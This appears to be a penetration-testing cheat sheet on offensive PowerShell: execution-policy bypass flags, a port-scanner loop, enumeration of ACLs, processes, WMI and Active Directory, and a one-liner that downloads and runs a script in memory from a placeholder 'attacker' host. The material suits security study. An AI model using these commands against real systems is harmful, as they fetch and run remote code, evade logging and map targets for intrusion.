PowerShell is a powerful Windows scripting and automation framework widely used in system administration and penetration testing. It provides deep access to the OS, Active Directory, and .NET classes.

The main PowerShell executable is typically located at:

```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

This binary can be invoked directly from `cmd.exe`, scripts, or remote shells.

---

## Execution Policy Bypass Techniques

Windows enforces execution policies to restrict script execution. In restricted environments (common in corporate domains or labs), scripts may not run by default.

### Bypass Execution Policy (One-Liner)

```bash
powershell.exe -ep bypass
```

This launches a PowerShell session ignoring execution policy restrictions.

### Spawn CMD via Bypass

```bash
powershell.exe -ExecutionPolicy Bypass cmd.exe
```

This executes `cmd.exe` through a PowerShell instance with execution restrictions disabled.

### Unrestricted Execution

```bash
powershell.exe -ExecutionPolicy Unrestricted cmd.exe
```

This allows full script execution. It is noisy and risky in real environments, often logged or monitored.

### In-Memory Script Execution 

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

This downloads and executes a script directly in memory, avoiding disk artifacts.

---

## File and Folder Permission Enumeration

PowerShell allows inspection of ACLs (Access Control Lists), which is useful for identifying privilege escalation paths.

### Retrieve ACL Information

```powershell
Get-Acl "C:\Program Files (x86)\TargetFolder" | Format-List
```

This displays detailed permission entries, including users, groups, and rights.

### Practical Use Case

Look for:

- Write permissions on sensitive directories
    
- Misconfigured services or binaries
    
- Weak permissions on startup scripts
    

---

## Process Enumeration

Enumerating running processes helps identify:

- Interesting applications (browsers, AV, services)
    
- Potential privilege escalation vectors
    
- Credentials in memory targets
    

### List Running Processes

```powershell
Get-Process | Sort-Object ProcessName -Unique | Select-Object ProcessName, Id
```

Displays unique processes with their IDs.

### Retrieve Process Path

```powershell
Get-Process firefox | Format-List Path
```

Shows the full binary path of a specific process.

---

## System Enumeration via WMI

WMI (Windows Management Instrumentation) provides detailed system information useful for enumeration and privilege escalation.

### Retrieve OS Information

```powershell
Get-WmiObject -Class Win32_OperatingSystem | Select-Object *
```

This returns:

- OS version
    
- Hostname
    
- Installed date
    
- Architecture
    

### Modern Alternative (Less Noisy)

```powershell
Get-CimInstance Win32_OperatingSystem
```

Preferred in modern environments due to better performance and lower detection.

---

## Network Enumeration with PowerShell

PowerShell can be used for basic network scanning without external tools.

### TCP Port Scanner

```powershell
$target = "192.168.1.1"
$ports = 1..1024

foreach ($port in $ports) {
    $tcp = New-Object System.Net.Sockets.TcpClient
    try {
        $tcp.Connect($target, $port)
        if ($tcp.Connected) {
            Write-Host "Port $port is OPEN"
            $tcp.Close()
        }
    } catch {}
}
```

### Practical Notes

- Useful when tools like `nmap` are not available
    
- Slow compared to native scanners
    
- Works well in restricted environments (e.g., compromised hosts)
    

---

## Active Directory Enumeration Context

PowerShell is heavily used for AD enumeration, especially when tools like PowerView are available.

Even without external modules, .NET classes can be leveraged:

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

This provides domain-level information such as:

- Domain controllers
    
- Forest structure
    
- Trust relationships
